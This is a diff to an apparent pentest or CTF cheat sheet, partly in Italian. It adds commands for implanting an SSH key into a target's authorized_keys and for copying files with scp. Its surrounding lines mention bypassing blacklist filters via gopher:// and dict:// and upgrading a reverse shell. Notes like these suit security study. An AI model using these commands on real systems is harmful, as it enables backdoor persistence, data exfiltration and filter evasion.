@@ -36,6 +36,17 @@ intercept and modify requests, public endpoint:
 # notes
 bypass http blacklist filter with `dict://` `gopher://`
 test antivirus or signature check using EICAR Files
+
+## Implanting SSH keys
+`echo "Your SSH public key here (id_rsa.pub)" > /home/<user>/.ssh/authorized_keys`
+
+## Transferring files with SCP
+from destination to source:
+`scp path_file_to_send dest_user@dest_ip:/path_to_receive`
+
+from source to destination:
+`scp dest_user@dest_ip:/path_to_receive files_received `
+
 ## Reverse Shell Upgrade
 quando si ottiene la shell, comunque non è possibile usare le frecce ecc perché escono caratteri strani quindi serve fare un "upgrade" della shell tramite 
 
